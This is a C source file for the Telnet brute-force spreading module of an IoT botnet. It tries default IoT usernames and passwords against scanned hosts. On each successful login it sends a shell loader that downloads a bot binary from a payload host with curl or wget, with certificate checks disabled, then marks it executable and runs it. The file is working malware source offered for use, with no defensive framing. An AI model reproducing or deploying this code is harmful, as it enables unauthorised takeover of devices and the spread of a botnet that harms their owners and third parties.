#include "../../include/botnet.h"
#include "../../include/config.h" // ¡LA SOLUCIÓN!

#define BRUTE_FORCE_THREADS 4

// A simple, thread-safe queue for targets found by the scanner
#define MAX_QUEUE_SIZE 100
static struct target target_queue[MAX_QUEUE_SIZE];
static int queue_head = 0, queue_tail = 0, queue_count = 0;
static pthread_mutex_t queue_lock;
static pthread_cond_t queue_cond;

// Common IoT credentials
const char *usernames[] = {"root", "admin", "user", "login"};
const char *passwords[] = {"root", "admin", "user", "12345", "password", "default"};
const int num_usernames = sizeof(usernames) / sizeof(char *);
const int num_passwords = sizeof(passwords) / sizeof(char *);

void *brute_force_worker(void *args) {
    while (1) {
        pthread_mutex_lock(&queue_lock);
        while (queue_count == 0) {
            pthread_cond_wait(&queue_cond, &queue_lock);
        }
        struct target t = target_queue[queue_head];
        queue_head = (queue_head + 1) % MAX_QUEUE_SIZE;
        queue_count--;
        pthread_mutex_unlock(&queue_lock);

        printf("[*] Brute-forcing Telnet target: %s\n", inet_ntoa(*(struct in_addr *)&t.addr));

        int sock;
        struct sockaddr_in target_addr = { .sin_family = AF_INET, .sin_port = t.port, .sin_addr.s_addr = t.addr };

        for (int i = 0; i < num_usernames; i++) {
            for (int j = 0; j < num_passwords; j++) {
                sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) continue;

                if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
                    close(sock);
                    goto next_target;
                }

                char buffer[1024];
                sleep(1); read(sock, buffer, sizeof(buffer)-1);
                write(sock, usernames[i], strlen(usernames[i])); write(sock, "\n", 1);
                sleep(1); read(sock, buffer, sizeof(buffer)-1);
                write(sock, passwords[j], strlen(passwords[j])); write(sock, "\n", 1);
                sleep(1);

                int bytes_read = read(sock, buffer, sizeof(buffer)-1);
                if (bytes_read > 0) {
                    buffer[bytes_read] = '\0';
                    if (strstr(buffer, "#") || strstr(buffer, "$")) {
                        printf("[+] SUCCESS! Found credentials for %s -> %s:%s. Delivering payload over HTTPS...\n",
                               inet_ntoa(*(struct in_addr *)&t.addr), usernames[i], passwords[j]);

                        // Construct the multi-arch, HTTPS-based loader command
                        char loader_cmd[1024];
                        snprintf(loader_cmd, sizeof(loader_cmd),
                                 "ARCH=$(uname -m); case $ARCH in arm*) DIR=\"arm\";; mips*) DIR=\"mips\";; x86_64) DIR=\"x86_64\";; *) exit;; esac; cd /tmp; (curl -kfsSL https://%s:443/$DIR/bot -o bot || wget --no-check-certificate -qO- https://%s:443/$DIR/bot > bot); chmod +x bot; ./bot &\n",
                                 PAYLOAD_HOST, PAYLOAD_HOST);
                        
                        write(sock, loader_cmd, strlen(loader_cmd));
                        increment_infection_counter();

                        close(sock);
                        goto next_target;
                    }
                }
                close(sock);
            }
        }
    next_target:
        continue;
    }
    return NULL;
}

void brute_force_add_target(struct target *t) {
    pthread_mutex_lock(&queue_lock);
    if (queue_count < MAX_QUEUE_SIZE) {
        target_queue[queue_tail] = *t;
        queue_tail = (queue_tail + 1) % MAX_QUEUE_SIZE;
        queue_count++;
        pthread_cond_signal(&queue_cond);
    }
    pthread_mutex_unlock(&queue_lock);
}

void brute_force_init() {
    pthread_t thread_id;
    pthread_mutex_init(&queue_lock, NULL);
    pthread_cond_init(&queue_cond, NULL);
    for (int i = 0; i < BRUTE_FORCE_THREADS; i++) {
        pthread_create(&thread_id, NULL, brute_force_worker, NULL);
    }
    printf("[+] Brute force module initialized with %d threads.\n", BRUTE_FORCE_THREADS);
}
